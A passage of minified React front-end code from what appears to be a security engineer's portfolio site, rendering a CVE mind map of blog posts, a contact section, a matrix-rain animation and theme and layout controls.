${g.type}`,onPointerDown:B=>m(g,B),onClick:()=>f(g),onMouseEnter:()=>{var B;if(r){const[W,w]=l.apply([g.x,g.y]),O=(B=a.current)==null?void 0:B.getBoundingClientRect();r({node:g,screen:{x:O?O.left+W:W,y:O?O.top+w:w}})}},onMouseLeave:()=>r==null?void 0:r(null),style:{cursor:"pointer"},children:[y.jsx("circle",{className:"node-spotlight",r:b+16}),y.jsx("circle",{r:b,fill:N,fillOpacity:M?1:.6,stroke:M?"#d5d5d5":"rgba(255,255,255,0.15)",strokeWidth:M?2:1}),y.jsx("circle",{className:"node-halo",r:b+4})]},g.id)})]})]})})}function zw(e=[],n="year"){const t=i=>n==="severity"?i.severity||"Info":i.year||"Unknown",s=e.reduce((i,a)=>{const l=t(a);return i[l]||(i[l]=[]),i[l].push(a),i},{}),r=n==="severity"?(i,a)=>i.localeCompare(a):(i,a)=>a.localeCompare(i);return{name:"CVE Map",children:Object.keys(s).sort(r).map(i=>({id:`${n}-${i}`,name:i,nodeType:"cluster",children:s[i].map(a=>({...a,name:a.id||a.title,value:1,nodeType:"cve"}))}))}}function jw(){const[e,n]=C.useState("year"),t=C.useMemo(()=>{const p=T=>T.toUpperCase().includes("CVE"),f=T=>{if(!T)return"Unknown";const g=new Date(T).getFullYear();return Number.isFinite(g)?String(g):"Unknown"},m=T=>{const g=((T||"").match(/\d/g)||[]).reduce((M,N)=>M+Number(N),0),b=["Low","Medium","High","Critical"];return b[g%b.length]},S=T=>T==="Critical"?9.4:T==="High"?8.1:T==="Medium"?6:4;return lo.filter(T=>p(T.title)).map(T=>{const I=T.title.match(/CVE[-–](\d{4})[-–]?([\d]+)/i),g=I?`CVE-${I[1]}-${I[2]}`:T.slug.toUpperCase(),b=m(g);return{id:g,title:T.title,severity:b,cvss:S(b),year:f(T.date),kev:!1,summary:T.excerpt,href:T.href||`/blog/${T.slug}`}})},[]),s=C.useMemo(()=>zw(t,e),[t,e]),[r,i]=C.useState(null),[a,l]=C.useState([]),[o,c]=C.useState(0),[u,d]=C.useState(null),[h,v]=C.useState(null),[k,x]=C.useState(""),A=p=>{i(p),x((p==null?void 0:p.id)||"")};return y.jsxs("div",{className:"cve-fullscreen",children:[y.jsx("div",{className:"mindmap-watermark","aria-hidden":"true",children:"CVE // MIND MAP"}),y.jsxs("div",{className:"mindmap-stage mindmap-shell",children:[y.jsxs("div",{className:"mode-icon-bar","aria-hidden":"true",children:[y.jsx("button",{className:`mode-icon ${e==="year"?"active":""}`,onClick:()=>n("year"),title:"Group by year",children:y.jsx("span",{className:"icon glyph-years"})}),y.jsx("button",{className:`mode-icon ${e==="severity"?"active":""}`,onClick:()=>n("severity"),title:"Group by severity",children:y.jsx("span",{className:"icon glyph-severity"})})]}),y.jsxs("div",{className:"mindmap-canvas",children:[y.jsx(Dw,{data:s,onSelectCve:A,onFocusPath:l,highlightId:k,onHover:p=>{var f,m;d((p==null?void 0:p.node)||null),p&&p.screen?v({name:p.node.name,title:((f=p.node.info)==null?void 0:f.title)||p.node.name,href:(m=p.node.info)==null?void 0:m.href,x:p.screen.x,y:p.screen.y}):v(null)},hoveredId:u==null?void 0:u.id},o),h&&y.jsxs("div",{className:"mindmap-preview",style:{left:h.x,top:h.y},children:[y.jsx("div",{className:"preview-title",children:h.title}),h.href?y.jsx("a",{href:h.href,target:"_blank",rel:"noreferrer",children:"open blog"}):null]})]})]}),y.jsx(ay,{cve:r,onClose:()=>i(null)})]})}function Bw(){const e="hemparekh1596@gmail.com",[n,t]=C.useState(!1),s=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return y.jsx("section",{className:"contact-strip",id:"contact",children:y.jsxs("div",{className:"container contact-grid",children:[y.jsxs("div",{children:[y.jsx("p",{className:"pill",children:"Let’s talk"}),y.jsx("h2",{children:"Signal received. Drop a note and let’s build secure systems."}),y.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&y.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),y.jsxs("div",{className:"contact-actions",children:[y.jsx("button",{className:"button primary",onClick:s,type:"button",children:"Copy Email"}),y.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),y.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function Fw(){const[e,n]=C.useState(0);return C.useEffect(()=>{const t=()=>{const{scrollTop:s,scrollHeight:r,clientHeight:i}=document.documentElement,a=r>i?s/(r-i)*100:0;n(Math.min(100,Math.max(0,a)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),y.jsx("div",{className:"scroll-progress",children:y.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function Uw(){const[e,n]=C.useState(!1);return C.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?y.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function Hw(){const e=C.useRef(null),n=C.useRef(null);return C.useEffect(()=>{const t=e.current;if(!t)return()=>{};const s=t.getContext("2d");let r=t.width=window.innerWidth,i=t.height=window.innerHeight;const a=16;let l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:.5+Math.random()*.9}));const c="アカサタナハマヤラワ0123456789日田由止育宇禾水火木金土文ﾊﾐﾋﾑﾍﾎｱｶｻﾀﾅﾊﾏ",u=()=>{s.fillStyle="rgba(0, 0, 0, 0.12)",s.fillRect(0,0,r,i),s.font=`${a}px "IBM Plex Mono", monospace`,o.forEach((h,v)=>{const k=c[Math.floor(Math.random()*c.length)],x=v*a,A=h.y*a;s.fillStyle="rgba(200, 200, 200, 0.9)",s.fillText(k,x,A),s.fillStyle="rgba(200, 200, 200, 0.18)",s.fillText(k,x,A-a),h.y+=h.speed,h.y*a>i&&Math.random()>.95&&(h.y=0,h.speed=.5+Math.random()*.9)}),n.current=requestAnimationFrame(u)},d=()=>{r=t.width=window.innerWidth,i=t.height=window.innerHeight,l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:1+Math.random()*2}))};return window.addEventListener("resize",d),u(),()=>{window.removeEventListener("resize",d),n.current&&cancelAnimationFrame(n.current)}},[]),y.jsx("canvas",{ref:e,className:"matrix-rain","aria-hidden":"true"})}function Vw(){const[e,n]=C.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return C.useEffect(()=>{const s=document.body;s.classList.remove("light","dark"),s.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(s=>s==="light"?"dark":"light")}}}function Ww(){const{theme:e,toggleTheme:n}=Vw(),[t,s]=C.useState(!0),[r,i]=C.useState(!0),a=C.useCallback((o,c)=>{const u=document.body;u&&(o?u.classList.remove("hud-scanlines-off"):u.classList.add("hud-scanlines-off"),c?u.classList.remove("hud-noise-off"):u.classList.add("hud-noise-off"))},[]);C.useEffect(()=>{try{const o=localStorage.getItem("hud:scanlines")!=="off",c=localStorage.getItem("hud:noise")!=="off";s(o),i(c),a(o,c)}catch{a(!0,!0)}},[a]),C.useEffect(()=>{try{localStorage.setItem("hud:scanlines",t?"on":"off"),localStorage.setItem("hud:noise",r?"on":"off")}catch{}a(t,r)},[t,r,a]);const l=C.useCallback(()=>{if(typeof window<"u"){window.dispatchEvent(new CustomEvent("hud:reset-layout",{detail:"all"}));try{Object.keys(localStorage).filter(o=>o.startsWith("hud:window:")||o.startsWith("hud:")).forEach(o=>localStorage.removeItem(o))}catch{}}},[]);return C.useEffect(()=>{const o=c=>{if(!((c.ctrlKey||c.metaKey)&&c.shiftKey))return;const u=c.key.toLowerCase();u==="r"&&(c.preventDefault(),l()),u==="s"&&(c.preventDefault(),s(d=>!d)),u==="n"&&(c.preventDefault(),i(d=>!d))};return window.addEventListener("keydown",o),()=>window.removeEventListener("keydown",o)},[l]),y.jsx(Pg,{children:y.jsxs("div",{className:"app-shell",children:[y.jsx(Hw,{}),y.jsx(Fw,{}),y.jsx(Rg,{onToggleTheme:n,theme:e}),y.jsx("main",{children:y.jsxs(bg,{children:[y.jsx(kn,{path:"/",element:y.jsx(Dc,{})}),y.jsx(kn,{path:"/blogs",element:y.jsx(Bg,{})}),y.jsx(kn,{path:"/projects",element:y.jsx(ry,{})}),y.jsx(kn,{path:"/certifications",element:y.jsx(iy,{})}),y.jsx(kn,{path:"/blog/:slug",element:y.jsx(sy,{})}),y.jsx(kn,{path:"/cve-map",element:y.jsx(jw,{})}),y.jsx(kn,{path:"*",element:y.jsx(Dc,{})})]})}),y.jsx(Bw,{}),y.jsx(Og,{}),y.jsx(Uw,{})]})})}fd(document.getElementById("root")).render(y.jsx(pu.StrictMode,{children:y.jsx(Ww,{})}));
